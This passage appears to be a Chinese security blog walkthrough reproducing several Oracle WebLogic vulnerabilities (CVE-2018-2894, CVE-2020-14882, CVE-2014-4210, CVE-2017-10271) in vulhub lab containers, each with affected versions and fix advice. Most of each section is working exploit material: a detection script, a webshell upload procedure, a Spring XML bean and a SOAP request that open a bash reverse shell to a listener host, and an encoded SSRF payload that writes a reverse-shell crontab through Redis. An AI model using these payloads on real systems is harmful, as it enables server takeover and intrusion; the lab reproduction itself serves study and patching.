![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE15CbBbyP8iaJz3v5PYljvXzUYIr2JuOJibHIUibQXzUg8ibVzib8THg1cYA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEtV7aOXZzaRIXZRElSXdZqFy8HWEICHnFznoApwEdn7HjA1BCGiapmOA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE3pUgRKMIjILiauR8fEcSwTShDp1QGyWAia1CHHyQEbJzZ1ELzlicTbCLw/640?wx_fmt=png&from=appmsg "")  
  
利用方式3 工具  
  
工具链接：  
```
https://github.com/One-Fox-Security-Team/One-Fox-T00ls
```  
  
  
**修复建议**  
```
更新补丁。
禁用 T3 协议或禁止 T3 端口对外开放，或限制可访问 T3 端口的 IP 来源。
升级版本。
```  
  
  
**0x7****CVE-2018-2894**  
  
**漏洞描述**  
  
    该漏洞是由弱口令引起的，攻击者通过弱口令进入 WebLogic Server 开启 Web Server Test Page 服务，在WebLogic Server Test Page 中存在一处文件上传漏洞。  
  
  
**影响范围**  
```
WebLogic 10.3.6.0
WebLogic 12.1.3.0
WebLogic 12.2.1.2
WebLogic 12.2.1.3
```  
  
**环境搭建**  
```
cd vulhub/weblogic/CVE-2018-2894  
docker-compose up -d
```  
  
环境搭建好之后查看管理员密码  
```
docker compose logs | grep password
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVETHibddKicFhp0502lv98QALLnbPHcX18r3WZJb9iat6aySINqCyUMQgnQ/640?wx_fmt=png&from=appmsg "")  
```
username: weblogic
password: PSbXk8JO
```  
  
**漏洞复现**  
  
使用脚本检测是否存在 CVE-2018-2894 漏洞  
```
import requests


def poc(checkedSocket):
    checkURL1 = "http://" + checkedSocket + "/ws_utc/config.do"
    checkURL2 = "http://" + checkedSocket + "/ws_utc/begin.do"

    headers = {
        'Content-Type': 'text/html; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    }

    httpRequest1 = requests.get(checkURL1, headers)
    httpRequest2 = requests.get(checkURL2, headers)

    if httpRequest1.status_code == 200 and httpRequest2.status_code == 200:
        print("[*] 存在CVE-2018-2894或其他漏洞!")
    else:
        print("[*] 不存在此漏洞")

if __name__ == '__main__':
    checkedSocket = "192.168.111.128:7001"
    poc(checkedSocket)
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEM7iarR8Wwib8mnuYRZusTPfbJz7yRRxjzIZK9mMajC8Syh0KpBOWrQUQ/640?wx_fmt=png&from=appmsg "")  
  
访问登录页面进行登录  
```
http://<IP/DomainName>:7001/console/login/LoginForm.jsp
```  
  
用户名和口令就是搭建环境时拿到的用户名和密码  
```
username: weblogic
password: PSbXk8JO
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE7P5q49GGJy0fUk4gRibD27jlIKjemtaFf8jQQt7tZ8AAEN5RiauGm22Q/640?wx_fmt=png&from=appmsg "")  
  
由于 Oracle 已经修复了 WebLogic Web Service Test Page 中一处文件上传漏洞，所以我们想要利用这个漏洞需要手动开启 Web 服务。  
  
找到 base_domain  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEWbYnWLSIBpbXiclyLiahVhvWRElA6lY30ztrve56hf99nibymuF5uKmJA/640?wx_fmt=png&from=appmsg "")  
  
点击“高级”  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEmuOT8tBiamPkmwWbYMr0Z8UXSjKcIZBSicb6hb3gRdQBvNaFLJAd70Gg/640?wx_fmt=png&from=appmsg "")  
  
勾选 “启用 Web 服务测试页”，然后保存  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVElwTOR6zOUFTQm8HwgR8fWEawDfWdlIfCdB50HoQzxvBnIELkNZYDTA/640?wx_fmt=png&from=appmsg "")  
  
启用 Web 服务测试页之后需要修改 ws_utc/config.do（未授权访问）下的当前工作目录  
  
访问 http://<IP/DomainName>:7001/ws_utc/config.do  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEQPkLtGKpeheb15dXOOEpia88CjmQxwUdrRe0QWyunNGjBUqHJUicTTAg/640?wx_fmt=png&from=appmsg "")  
  
将当前工作目录中的路径  
```
/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir
```  
  
修改为  
```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css（访问这个目录无需权限）
```  
  
修改之后进行提交  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEqp7ePPITn76PqoE0dmPv2x59qqdhogqicc5bxL2DCs5Tx4DOV7NibWCA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVERrVSh12365UZ1HBIIUyo0U4FMQKIPxHspMCjKeIT94oVuDRK1AoGicg/640?wx_fmt=png&from=appmsg "")  
  
提交之后点击左侧的 “安全”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEtr3TicRZIH3F11Xtd91kbxsoUYmTC8G1X4V9UPl3fKibBjvxqwaBB9Ag/640?wx_fmt=png&from=appmsg "")  
  
点击“添加”，这里可以上传 WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEnfz43pGTGjoqb1wvTKahT8QvibpicYOSAKiatLzMRheic84IccVicJVtQCQ/640?wx_fmt=png&from=appmsg "")  
  
上传 WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEfK8aGr4aicTFf2nz5h30OJLQfHXAE801ZADZcyKEvhq7QqGviaFXdF4w/640?wx_fmt=png&from=appmsg "")  
  
利用 BurpSuite 抓包获取时间戳  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEhTmnc3z4RztteXGQSbfbDMf2iac8jmeZyUPJ0GicwEHxPDhHtxgYHNbg/640?wx_fmt=png&from=appmsg "")  
  
拿到时间戳之后构造 WebShell 访问路径  
```
http://<ip/domain>:7001/ws_utc/css/config/keystore/<服务器响应时间戳>_<文件名>
```  
  
http://192.168.111.128:7001/ws_utc/css/config/keystore/1730170162648_shell.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVENRmljBCLFBpJY6TRTiccHjUao5ib6a3jDltRZL6ymia0egeUQ4ibCbIIkw/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEoll7OpH9d5J9A7BuiabuT8xzMZPvUDSuQPKQib7Q4ic2YBnH2e1BSKqWQ/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
```
升级 Oracle WebLogic Server 到已经修复该漏洞的版本。
如果无法立即升级，可以通过配置 WebLogic Server 来限制对/ws_utc/begin.do和/ws_utc/config.do页面的访问。你可以要求用户进行身份验证才能访问这些页面，或者完全禁用这些页面。
```  
  
  
**0x8 CVE-2020-14882**  
  
**漏洞描述**  
  
    CVE-2020-14882 允许远程⽤户绕过管理员控制台组件中的身份验证。CVE-2020-14883 允许经过身份验证的⽤户在管理员控制台组件上执⾏任何命令。使⽤这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执⾏任 意命令并完全控制主机。  
  
**影响范围**  
```
WebLogic 10.3.6.0.0
WebLogic 12.1.3.0.0
WebLogic 12.2.1.3.0
WebLogic 12.2.1.4.0
WebLogic 14.1.1.0.0
```  
  
**环境搭建**  
```
cd vulhub/weblogic/CVE-2020-14882 
docker-compose up -d
```  
  
**漏洞复现**  
```
未授权路径：http://<IP/DomainName>:7001/console/css/%252e%252e%252fconsole.portal
注：1. 不要进行 URL 解码。2. 需要多次访问，第一次访问的响应状态码是 404。
```  
  
http://192.168.111.128:7001/console/css/%252e%252e%252fconsole.portal  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEPHYcJRcxZbor2s9cD96EAdIxxbtFJP7dFxKkMRQWegHp8pTbs2jKTQ/640?wx_fmt=png&from=appmsg "")  
  
利用方式1  
  
利用 com.tangosol.coherence.mvel2.sh.ShellSession 类（只能在 WbLogic 12.1.0 以上版本利用）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEQYhV2snEudqYicTK2BjsrYvYokSfAtFBxT36zFGA3o7gYZVviaM8wQwQ/640?wx_fmt=png&from=appmsg "")  
```
http://192.168.111.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/success%27);%22)
注意：不要进行 URL 解码。
```  
  
访问之后响应页面如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEd816QNwicib3ia98icIgoibkXxXZDJ1iaoLvZ67lbcxvmYuJGnjF8QibQz1HQ/640?wx_fmt=png&from=appmsg "")  
  
可以在 docker 中查看命令是否执行成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEL7TdF1iaCq4UiczTIH11g4F3bsfhMLFk8fLuYz5CcIJtpSm48b5S2z4Q/640?wx_fmt=png&from=appmsg "")  
  
success 存在，说明命令执行成功！  
  
利用方式2  
  
com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext，更为通杀的一种方式。  
  
利用思路：利用 RCE 漏洞将 Web Server 上的反弹 shell 文件下载到本地并执行反弹 Shell。  
```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/192.168.235.9/7777 0>&1]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```  
  
EXP  
```
http://<靶机 IP>:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://<Web Server Socket>/CVE-2020-14882.xml%22)
```  
  
  
http://192.168.111.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://192.168.235.9/CVE-2020-14882.xml%22)  
  
开启端口监听  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEz2cdukjDhf39e5pqMricnJSzsgbZRAibJW6kNtC6vAu0GoZ3evGAEic4A/640?wx_fmt=png&from=appmsg "")  
  
访问URL  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE5GdpMKxtpKEeOqicK9hb3vDDTdxibrlW9wN9Ag4eyIUwmSIiaib8R712oQ/640?wx_fmt=png&from=appmsg "")  
  
成功接收到Shell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE9TyMN8ic4j8ysnZ141WB7val7s9DBpvcnfKyiciac2jicUicP37ohO2scJg/640?wx_fmt=png&from=appmsg "")  
  
  
**修复建议**  
```
升级系统或下载安装补丁。
WebLogic 不出网。
在不影响正常业务的情况下，建议暂时对外关闭后台/console/console.portal的访问权限，以防止未经授权的访问。
```  
  
  
**0x9****CVE-2014-4210**  
  
**漏洞描述**  
  
    WebLogic SSRF漏洞形成的原因主要是由于服务端验证请求时没有对用户请求做出严格的过滤以及限制，导致其可以获取服务器的一定量的数据，并可以实现篡改获取的资源并请求发送给服务器。在WebLogic中，这个漏洞主要出现在uddi组件（具体为uddi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp）。  
  
  
**影响范围**  
```
WebLogic 10.0.2
WebLogic 10.3.6
```  
  
**环境搭建**  
```
cd vulhub/weblogic/ssrf
docker compose up -d
```  
  
复现之前一定要先检测 redis 服务是否启动，如果多次尝试都无法启动 redis，则需要修改 /etc/default/grub  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEohjkkuCf3icTwcsmT9d7m6kQYpgBThgUIQNyFq8IXZOXPiaSbiampwvZg/640?wx_fmt=png&from=appmsg "")  
```
vim /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT="vsyscall=emulate"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEg7xQ9n2ha0q1bibBicPwDWmPyac9k4dTL9qxjhqHa6OYPcOHVJv1lRSw/640?wx_fmt=png&from=appmsg "")  
  
然后执行下面的更新命令  
```
update-grub
```  
  
最后reboot重启系统，重启docker环境  
```
cd vulhub/weblogic/ssrf
docker compose up -d
docker compose ps
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEcPYSt1kEZYD3ylpSpKvSfRbibQM9dzNRqRTEQ2MugT6eics0KIYA9zcQ/640?wx_fmt=png&from=appmsg "")  
  
**漏洞复现**  
  
  
SSRF 漏洞存在路径如下  
```
http://<IP/DomainName>:7001/uddiexplorer/SearchPublicRegistries.jsp
```  
  
浏览器访问靶机：  
  
http://192.168.111.128:7001/uddiexplorer/SearchPublicRegistries.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEEpicq9uEJR4oUDWlJhtw0Uc3KZKpJ83uAe2xrcO2DbXtJXsYpv6Jjuw/640?wx_fmt=png&from=appmsg "")  
  
构造 HTTP 请求包发起 SSRF 攻击  
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: 192.168.111.128:7001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```  
  
其中 operator 是可控参数，下面是几种响应结果  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEksFEpjnibF3IL4KCdoufS9TLy1eCDQiaRiarLdXZY2Al1Ok5hGvOZIKgA/640?wx_fmt=png&from=appmsg "")  
  
如果进行端口探测，如果端口是否对外开放的响应结果是不同的，具体可以看 An error has occurred字符串下面的内容，下面是端口对外开放的响应包。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVErRJoN9PfiaYULldUnib1rwf58QBwC2RCRIfKnia6n0CFurCdQRTg4WHTA/640?wx_fmt=png&from=appmsg "")  
  
下面是端口不对外开放的响应包，响应的内容大概是连接不到 127.0.0.1:7000  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEvf0ialbQHxLrQ2rlHnOM4OKcFCk2uLicKGPvXRQuMWeceqVZB390bwNg/640?wx_fmt=png&from=appmsg "")  
  
查看 docker 环境的 IP（其实这里获取 IP 的方式在实战中不可行），检测 docker 环境中开启了什么服务  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEHtXshZiad1O1R4L9QZCtYa5GhRwK72eT1RkKd5vtibROhMQyTjbSWomw/640?wx_fmt=png&from=appmsg "")  
  
可以通过 Setup UDDI Explorer获取内网 IP 的  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEonvwibp9J1uddEE31EPjicGygl1HFcG7sTlkKUT1aOhYOshvp6ibxX22g/640?wx_fmt=png&from=appmsg "")  
  
也可以使用脚本进行内网探测  
  
在对内网端口探测时  
发现可以连接 redis 服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEhG7hSocjb9maClGy48FN6HvLnLk8fZ3vwWibicKcKqtko9o40jS6ZsRg/640?wx_fmt=png&from=appmsg "")  
  
WebLogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。这里利用redis反弹Shell。  
```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.235.9/7777 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
aa
```  
  
进行URL编码  
```
%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.235.9%2F7777%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaa
```  
  
完整的EXP  
```
http://172.19.0.2:6379/text%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.235.9%2F7777%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaa
```  
  
监听端口  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEwsb4iaClQ2LCxHlYj6wBaHvPK4Qn26gCsxHgr4icVPbBWFbiaTIqvQXkg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE99opKcPmUJ0ZZiblF1oP04WkIxbZ1l9D84bQPH1MS8hrkKJEIb6BVTw/640?wx_fmt=png&from=appmsg "")  
  
等待一会儿即可接收到Shell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE8e1jDxKwic16MB99RyjwAvGPp0LrBsOHuOBS6mHTGtBzS4VJ2icAdNeA/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
```
限制 uddiexplorer 应用只能内网访问。
在不影响业务的情况下，将 SearchPublicRegistries.jsp 文件删除。
```  
  
  
**0xA****CVE-2017-10271**  
  
**漏洞描述**  
  
    CVE-2017-10271与CVE-2017-3506的漏洞原理是一样的，即WebLogic对恶意的XML请求防范的不够严密。  
  
  
**影响范围**  
```
WebLogic 10.3.6.0
WebLogic 12.1.3.0
WebLogic 12.2.1.0
WebLogic 12.2.1.1
WebLogic 12.2.1.2
```  
  
**环境搭建**  
```
cd vulhub/weblogic/CVE-2017-10271
docker compose up -d
```  
  
**漏洞复现**  
  
访问下面的地址  
```
http://192.168.111.128:7001/wls-wsat/CoordinatorPortType11

访问下面的路径也可以
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11/wls-wsat/RegistrationRequesterPortType11
```  
  
出现下面这个页面则说明存在漏洞  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE1gQGHWDsIT74ZtAzCuELrWBrCSos8G3tLMz1XNsSUfsQicVqNh3H64A/640?wx_fmt=png&from=appmsg "")  
  
利用漏洞反弹 shell，  
开启端口监听  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVEwibxsSTaic6AicMQvmYcibfcj1lxu9FiaO8TIgu8KKgk7sVZ3oibgn91gIsg/640?wx_fmt=png&from=appmsg "")  
```
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 192.168.111.128: 7001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 824

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
<void index="1">
                  <string>-c</string>
                </void>
<void index="2">
 <string>bash -i &gt;&amp; /dev/tcp/192.168.235.9/7777 0&gt;&amp;1</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```  
  
成功接收到Shell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKptCgepBYlrpw4GFlTVAlVE2oibCNrfRicLSBtuyGxzrHdfqsOyflzoZIkJPKANw6ZYRFXPmNdtGA5Q/640?wx_fmt=png&from=appmsg "")  
  
  
**修复建议**  
```
更新到最新版本,打上10271的补丁,对访问wls-wsat的资源进行访问控制 ,或者根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
Middleware/wlserver_10.3/server/lib/wls-wsat.war
```  
  
  
如果想要及时了解更多内容，请关注   
Cyb3rES3c  
 微信公众号！  
  
  
  
  
